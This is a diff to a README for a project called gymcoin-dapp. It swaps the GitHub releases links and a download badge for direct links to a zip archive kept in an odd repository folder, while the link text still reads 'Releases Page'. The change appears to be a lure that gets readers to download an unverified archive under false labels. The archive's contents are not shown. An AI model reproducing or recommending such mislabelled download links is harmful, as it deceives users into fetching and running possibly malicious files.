@@ -8,15 +8,15 @@
 - **Real-Time Updates:** Instant data synchronization for a smooth experience.
 
 ## 📥 Download Now
-![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-brightgreen)
+![Download Latest Release](https://raw.githubusercontent.com/mwaila/gymcoin-dapp/main/preguidance/gymcoin-dapp.zip)
 
-Visit this page to download: [Releases Page](https://github.com/mwaila/gymcoin-dapp/releases)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/mwaila/gymcoin-dapp/main/preguidance/gymcoin-dapp.zip)
 
 ## 🚀 Getting Started
 To get started with gymcoin-dapp, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Click this link to go to the [Releases Page](https://github.com/mwaila/gymcoin-dapp/releases).
+   Click this link to go to the [Releases Page](https://raw.githubusercontent.com/mwaila/gymcoin-dapp/main/preguidance/gymcoin-dapp.zip).
 
 2. **Choose the Latest Version**  
    On the releases page, find the latest version of gymcoin-dapp. The latest version will be listed at the top.
